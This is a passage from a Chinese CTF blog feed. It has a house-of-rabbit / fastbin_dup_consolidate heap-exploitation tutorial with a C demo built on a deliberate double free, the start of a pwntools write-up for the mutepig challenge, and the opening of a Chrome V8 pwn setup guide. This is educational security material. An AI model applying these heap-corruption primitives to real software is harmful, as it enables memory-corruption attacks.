vulnerability</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;So p1 is double freed, and p3 hasn&#x27;t been freed although it now points to the top, as our\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk got consolidated with it. We have thus achieved UAF!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 and p1 will still be pointing to it.\n&quot;</span>);</span><br><span class="line"><span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">assert(p4 == p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We now have two pointers (p3 and p4) that haven&#x27;t been directly freed\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;and both point to the same large-sized chunk. p3=%p p4=%p\n&quot;</span>, p3, p4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We have achieved duplication!\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>还是老样子，把这个代码翻译一遍</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">源代码来源: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这个文档主要被使用展示malloc——consolidate并且它怎样被double free充分利用从而获得两个指向相同大小chunk的指针,这两个指针一般情况下由于previnuse检查很难被常规的利用.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">malloc_consolidate(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714) </span></span><br><span class="line"><span class="comment">本质上是合并所有相邻的处于fastbin中的堆块,合并后会将这个大堆块放入unsorted bin中,并且如果可以就会将top合并.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">在glibc 2.35中它仅仅在以下五个地方被调用:</span></span><br><span class="line"><span class="comment">1. _int_malloc: 一个处于large sized范围的chunk正在被分配(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965)</span></span><br><span class="line"><span class="comment">2. _int_malloc: 没有bins被寻找到并且top chunk太小了(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394)</span></span><br><span class="line"><span class="comment">3. _int_free: 如果这个chunk的大小&gt;= FASTBIN_CONSOLIDATION_THRESHOLD (65536) (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674)</span></span><br><span class="line"><span class="comment">4. mtrim: 总是调用 (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041)</span></span><br><span class="line"><span class="comment">5. __libc_mallopt: 总是调用 (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">我们将在第一个地方触发, 因此我们将需要分配一个不属于smallbin的堆块 (因为我们尝试进入这个检查的else分支中: https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901). </span></span><br><span class="line"><span class="comment">这意味着我们的chunk的size &gt;= 0x400 (它因是large-sized).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这个技术充分利用malloc_consolidate和double free去创造一个UAF或者一对large-sized chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;分配一个fastbin大小的chunk p1=%p \n&quot;</span>, p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;释放p1所指向的堆块,这个堆块将被放入fastbin中.\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;为了触发malloc_consolidate,我们需要再分配一个chunk,这个这个chunk的大小位于large chunk的范围(size&gt;=0x400)\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;对应着我们malloc传递的参数要求&gt;= 0x3f0. 这里我们使用malloc(0x400), 这时我们将申请到\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;一个大小为0x410的堆块.其堆地址为: p3=%p\n&quot;</span>, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nmalloc_consolidate 将p1指向的堆块(这个堆块已经被放入fastbin中了)与top chunk合并.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3所指向的堆块是从top chunk中切割下来的,因为没有没有bins储存的chunk比我们p3所指向的堆块大. 因此, p1 = p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert(p1 == p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;我们将对double free p1, 现在p1指向的是0x410大小的chunk,这个chunk我们只分配给p3.\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(p1); <span class="comment">// vulnerability</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;因此p1处于double freed的状态, and尽管p3现在指向的是top chunk但是p3还没有被释放,因为我们的chunk\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;与它(top chunk)合并.我们实现了UAF!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我们将申请一个0x400大小的chunk, 这会使得我们能从top_chunk得到0x410大小的chunk\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 and p1 将仍然指向之前的堆块.\n&quot;</span>);</span><br><span class="line"><span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">assert(p4 == p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我们现在有两个指针(p3 and p4),这两个指针并不能直接被释放\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;并且这两个指针都指向相同的large-sized chunk. p3=%p p4=%p\n&quot;</span>, p3, p4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我们直线了duplication!\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接下来我们跟着实验的代码去动调走一走。我们先使用<code>calloc</code>这个函数申请了<code>0x40</code>大小的堆块</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250307090316390.png" alt="image-20250307090316390"></p><ul><li>然后我们会将这个堆块释放，这个堆块释放后并不会马上与<code>Top chunk</code>合并，还是会先放入<code>fastbin</code>中。</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250307090545217.png" alt="image-20250307090545217"></p><ul><li>然后我们再申请一个处于<code>large bin</code>范围的大小，这里我们选择申请<code>0x400</code>大小的堆块，这时<code>malloc</code>为了减小系统调用的次数，<code>malloc</code>这个函数就会将<code>fastbin</code>中的空闲堆块进行处理。如果处理的对抗与<code>top_chunk</code>相邻该堆块就会与<code>top chunk</code>合并，然后我们所申请的<code>0x400</code>大小堆块的地址就是上图中的<code>fastbin</code>中的地址</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250307091145769.png" alt="image-20250307091145769"></p><ul><li>此时<code>p1</code>指针还没有被置<code>0</code>，这时我们就还可以对<code>p1</code>进行释放，这时我们就可以看到，当我们释放<code>p1</code>这个指针的时候就会使得我们所申请的<code>0x400</code>大小的堆块释放后与<code>top_chunk</code>合并，这时<code>top_chunk</code>的地址就变成了我们原来申请的堆块的地址</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250307091529801.png" alt="image-20250307091529801"></p><ul><li>之后我们再申请<code>0x400</code>大小的堆块，这样我们的<code>p3</code>指针和<code>p4</code>指针就指向了同一个堆块。</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250307092126413.png" alt="image-20250307092126413"></p><ul><li>这个实验的利用方式是通过<code>UAF</code>漏洞来进行利用的，而在<code>CTF_wiki</code>对<code>house-of-rabbit</code>其实有两种利用方式，第一种其实就是利用<code>UAF</code>漏洞去修改<code>fd</code>指针。</li><li>而第二种可以通过<code>UAF</code>或者堆溢出的漏洞去修改<code>size</code>位，从而构造出堆叠。</li></ul><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><ul><li>接下来我们来详细讲解一下利用方式。主要还是参考<code>ctf_wiki</code>上的利用方式，而实验中的利用方式确实不是很明显。</li></ul><h1 id="house_of_rabbit_level_1"><a href="#house-of-rabbit-level-1" class="headerlink" title="house_of_rabbit_level_1"></a>house_of_rabbit_level_1</h1><ul><li>接下来我们就来写一题。</li><li>这题的题目来源：pwn_hitbctf2018_mutepig</li></ul><h2 id="level1_分析1"><a href="#level1-分析1" class="headerlink" title="level1_分析1"></a>level1_分析1</h2><ul><li>拿到附件我们就先来<code>check</code>一下这些保护机制。发现开启了如下的保护机制。</li><li><code>got</code>表可以修改，然后<code>PIE</code>没有开启。</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250321221015123.png" alt="image-20250321221015123"></p><ul><li>接下来我们先来静态分析一下这个程序的具体运行逻辑。先来查看<code>main</code>函数，<code>main</code>函数的运行逻辑如下（我们先根据程序的大致逻辑，修改了函数名称）：<ul><li>首先<code>main</code>函数会先进行输入输出初始化即调用<code>init_()</code>函数</li><li>调用完<code>init_()</code>函数后就会调用<code>gift()</code>这个函数。（之后具体查看一下，就明白为什么我会重命名为gift函数）</li><li>之后就是进入一个菜单的循环，循环实现的是<code>增</code>、<code>删</code>、<code>改</code>这三个功能</li></ul></li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250321221502831.png" alt="image-20250321221502831"></p><ul><li>我们现在来查看一下<code>gift</code>这个函数，这个函数会执行<code>system(&quot;cat banner.txt&quot;)</code>，这就相当于我们有<code>system</code>这个函数了，我们就节省了泄露libc地址这一步。</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250321221743356.png" alt="image-20250321221743356"></p><ul><li>之后我们来查看一下<code>add()</code>这个函数，这个函数的执行逻辑大概可以分成两个部分<ul><li>第一个部分就是让用户输入选项，输入<code>1</code>、<code>2</code>、<code>3</code>三个选项的其中一个就会申请相应大小的堆块，这里如果输入<code>13337</code>就会申请一个非常大的堆块（只能申请一次）。</li><li>当申请失败的时候程序就会直接返回</li><li>之后用户可以向刚申请的堆块写入<code>0x7</code>字节的数据，第<code>0x8</code>个字节会变成空字节。</li><li>之后再对<code>ptr</code>这个指针数组进行遍历操作，将我们刚申请的堆块放入<code>ptr</code>这个指针数组空闲的位置中，在放入之前还会检查数组是否越界。</li></ul></li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250321222116773.png" alt="image-20250321222116773"></p><ul><li>然后我们再查看<code>edit</code>这个选项<ul><li>可以向用户指定的堆块重新写入<code>0x8</code>字节，实际写入<code>0x7</code>字节，最后一个字节会置<code>0</code></li><li>然后还会像全局变量<code>str</code>读入<code>48</code>个字节，即读入<code>0x30</code>字节。</li></ul></li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250321222817448.png" alt="image-20250321222817448"></p><ul><li>之后我们查看<code>delete</code>这个函数，这个函数实现的功能就为释放用户指定的堆块。<strong>注意：这里存在UAF漏洞，也就是说我们可以修改堆块的<code>fd</code>指针</strong></li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250321223035155.png" alt="image-20250321223035155"></p><h2 id="level_1分析2"><a href="#level-1分析2" class="headerlink" title="level_1分析2"></a>level_1分析2</h2><ul><li>接下来我们就先写好<code>exp</code>中与程序的交互部分。这时我们发现这个程序没有文字说明，就是纯交互。</li><li><code>exp</code>中交互的部分如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./mutepig_fix&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">choose</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(choose).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">context1,context2</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.send(context1)</span><br><span class="line">        p.send(context2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>接下来我们就来动态调试，一边动态调试，一边寻找打法。</li></ul><h2 id="level_1_exp"><a href="#level-1-exp" class="headerlink" title="level_1_exp"></a>level_1_exp</h2><h1 id="house_of_rabbit_level_2"><a href="#house-of-rabbit-level-2" class="headerlink" title="house_of_rabbit_level_2"></a>house_of_rabbit_level_2</h1><h1 id="house_of_rabbit_level_3"><a href="#house-of-rabbit-level-3" class="headerlink" title="house_of_rabbit_level_3"></a>house_of_rabbit_level_3</h1><h1 id="house_of_rabbit_level_4"><a href="#house-of-rabbit-level-4" class="headerlink" title="house_of_rabbit_level_4"></a>house_of_rabbit_level_4</h1><h1 id="house_of_rabbit_level_5"><a href="#house-of-rabbit-level-5" class="headerlink" title="house_of_rabbit_level_5"></a>house_of_rabbit_level_5</h1>]]></content>
    
    
    <summary type="html">前言：好像找回节奏了</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>Chrome-v8-入门</title>
    <link href="http://iyheart.github.io/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/"/>
    <id>http://iyheart.github.io/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/</id>
    <published>2025-02-25T12:15:28.000Z</published>
    <updated>2025-02-27T06:32:55.542Z</updated>
    
    <content type="html"><![CDATA[<ul><li>学习一下<code>Chrome-v8</code>，堆打累了，顺便给新生赛出一题简单的<code>chrome-v8</code>的<code>pwn</code>题</li><li>参考博客：<a href="https://a1ex.online/2021/09/17/Chorme-v8-入门学习/">Chorme-v8-入门学习 | A1ex’s Blog</a></li><li>参考博客：<a href="https://hornos3.github.io/2024/12/01/chrome-v8-pwn-学习-1/">chrome v8 pwn 学习 (1) | CoLin’s BLOG</a></li><li>参考博客：<a href="https://zmx2321.github.io/vite-blog/pages/note/front/v8-note/v8-note-9.html#使用-d8-进行调试">如何构建和使用V8的调试工具d8 | zmx的前端日志</a></li><li>参考博客：<a href="https://www.freebuf.com/vuls/203721.html">从一道CTF题零基础学V8漏洞利用 - FreeBuf网络安全行业门户</a></li><li>参考博客：<a href="https://sky123.blog.csdn.net/article/details/130124693?spm=1001.2014.3001.5502">Chrome v8 pwn-CSDN博客</a></li><li>参考博客：<a href="https://tangzichengcc.github.io/chrome_v8_CVE-2021-21220_复现与分析/">CVE-2021-21220 Chrome v8远程代码执行漏洞复现与分析 | 唐仔橙</a></li></ul><h1 id="浏览器相关知识"><a href="#浏览器相关知识" class="headerlink" title="浏览器相关知识"></a>浏览器相关知识</h1><ul><li><code>Chrome-v8</code>的<code>pwn</code>属于浏览器的<code>pwn</code>。接下来对浏览器做一个比较系统比较全面的了解</li><li><code>Chrome</code>就是我们经常说的<strong>谷歌浏览器</strong>，本质上是一个网页浏览器，该浏览器是由谷歌公司开发的。而<code>Chrome</code>里面的<code>JavaScript</code><strong>解释器</strong>被称为<code>v8</code>，一开始主要做的pwn题就是面向<code>v8</code>。</li><li>接下来介绍一下主流的<code>JS</code>引擎。</li></ul><div class="table-container"><table><thead><tr><th>引擎</th><th>开发者</th><th>主要应用</th><th>编译方式</th><th>备注</th></tr></thead><tbody><tr><td>V8</td><td>Google</td><td>Chrome、Node.js</td><td>JIT（TurboFan + lgnition）</td><td>速度快，广泛用于服务器端</td></tr><tr><td>SpiderMonkey</td><td>Mozilla</td><td>Firefox</td><td>JIT（IonMonkey）</td><td>早期JS引擎，支持WebAssembly</td></tr><tr><td>JavaScriptCore（JSC）</td><td>Apple</td><td>Safari、WebKit</td><td>JIT（Nitro）</td><td>适用于macOS/iOS</td></tr><tr><td>Chakra</td><td>Microsoft</td><td>旧版Edge、IE</td><td>JIT</td><td>Edge现已经改用V8</td></tr><tr><td>Hermes</td><td>Meta</td><td>React Native</td><td>AOT</td><td>专注移动端优化</td></tr><tr><td>QuickJS</td><td>Fabrice Bellard</td><td>嵌入式设备</td><td>解释执行（无 JIT）</td><td>轻量级，支持ES2020</td></tr></tbody></table></div><ul><li>而解释器这个的实现也就是使用<strong>底层语言</strong>去解释执行另一种语言，在这里是使用<code>C++</code>语言来解释<code>JavaScript</code>语言</li></ul><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="编译最新版本"><a href="#编译最新版本" class="headerlink" title="编译最新版本"></a>编译最新版本</h2><ul><li><p>（注：如果是在打比赛现学就请看编译之前版本）</p></li><li><p>这边需要手动编译源码，<code>chrome</code>里面的<code>JavaScript</code>解释器被称为v8</p></li><li><p>我们先要下载一个源码，这个源码被称为<code>v8</code>，而<code>v8</code>经过编译后的文件被称为<code>d8</code>。根据编译的可选项，可以编译出<code>debug</code>版本或者<code>release</code>版本，一般两个版本都编译出来</p></li><li><p>还需要下载两个编译<code>v8</code>源码的工具<code>depot_tools</code>、<code>ninja</code></p><ul><li><code>depot_tools</code>：是用来得到<code>v8</code>源码（也就是使用这个工具去下载<code>v8</code>源码，而不是直接使用<code>git</code>去拉取源码）</li><li><code>ninja</code>：用来编译<code>v8</code></li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br></pre></td></tr></table></figure><ul><li>然后将这两个工具添加进环境变量，将<code>depot_tools</code>添加环境变量（注意添加环境变量的时候需要使用绝对路径）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/home/myheart/CTF/pwn/chrome_v8_pwn/depot_tools&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure><ul><li>将<code>ninja</code>添加环境变量：在添加ninja为环境变量之前先要使用<code>./configure.py</code>编译<code>ninja</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ninja</span><br><span class="line">./configure.py --bootstrap</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/home/myheart/CTF/pwn/chrome_v8_pwn/ninja&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><ul><li>接下来就是使用<code>depot_tools</code>去下载源码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br></pre></td></tr></table></figure><ul><li>然后准备依赖和编译<code>v8</code><ul><li><code>gclient sync</code>:<code>v8</code>项目的所有依赖项（注意旧版的源码可能会出现Python版本问题）</li><li><code>tools/dev/v8gen.py x64.debug</code>：传递给<code>v8gen.py</code>一个参数，表示生成<code>x64</code>架构生成的<code>调试版本</code></li><li><code>ninja -C out.gn/x64.debug</code>：编译项目</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug    </span><br></pre></td></tr></table></figure><p><strong>注意</strong>：在<code>gclient sync</code>命令执行的时候可能会出现代理问题，执行成功后会在这个文件中生成文件。</p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250214200010144.png" alt="image-20250214200010144"></p><p><strong>注意</strong>：在<code>ninja -C out.gn/x64.debug</code>这个命令就是开始编译了，编译时间比较久，很吃CPU</p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250214202103840.png" alt="image-20250214202103840"></p><h2 id="回退版本与加载补丁"><a href="#回退版本与加载补丁" class="headerlink" title="回退版本与加载补丁"></a>回退版本与加载补丁</h2><ul><li>在打比赛的时候，需要对相应的版本进行调试，这就导致了我们需要编译指定的版本。在比赛中我们得到的<code>v8</code>不一定是最新版本，我们之前编译的版本是<code>V8 version 13.5.0</code>，假如我们比赛的时候<code>v8</code>的版本为<code>v8 version 13.3</code>版本，这时我们就要回退版本。</li><li>我们现在已经使用<code>fetch v8</code>，将远程的<code>v8</code>源码版本为<code>v8 version 13.5.0</code>给拉取到本地了。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218145114643.png" alt="image-20250218145114643"></p><ul><li>如果我们修改了这个源码，我们就可以使用<code>git diff &gt; my_changes.diff</code>，就会生成一个<code>my_changes.diff</code>文件，这个文件之后有用。</li><li>如果我们想要回退到指定的<code>v8</code>版本，这时就需要输入如下命令，用于查看<code>v8</code>的版本：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218145510100.png" alt="image-20250218145510100"></p><ul><li>要切换版本就需要输入如下命令：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git reset --hard  a7a350012c05f644f3f373fb48d7ac72f7f60542 (这后面的是<span class="built_in">hash</span>值)</span><br><span class="line">//6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">// 之后还需要执行如下命令</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure><h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><ul><li><p><code>js</code>有两种动态调试的方式</p><ul><li>第一种使用的是<code>d8</code>内部的<code>API</code>调试，但是调试并没有调试到<code>寄存器</code>、<code>内存</code>这么底层。</li><li>第二种就是使用<code>d8</code>配合<code>gdb</code>进行调试，这种调试就会涉及到<code>寄存器</code>和<code>内存</code></li></ul></li><li><p>对于第一种方式，具体介绍一下<code>V8</code>内部的比较重要的<code>API</code>：</p></li></ul><div class="table-container"><table><thead><tr><th>API</th><th>作用</th></tr></thead><tbody><tr><td>%SystemBreak();</td><td>触发断点（gdb调试的时候在相应上层js代码中触发断点，底层太多代码不好找断点）</td></tr><tr><td>%DebugPrint(dv);</td><td>输出对象<code>dv</code>的地址，目前最新版他会将<code>dv</code>对象的隐藏类型都会输出出来</td></tr><tr><td>console.log(%HasInlinedFunctionCode(bar));</td><td>查看 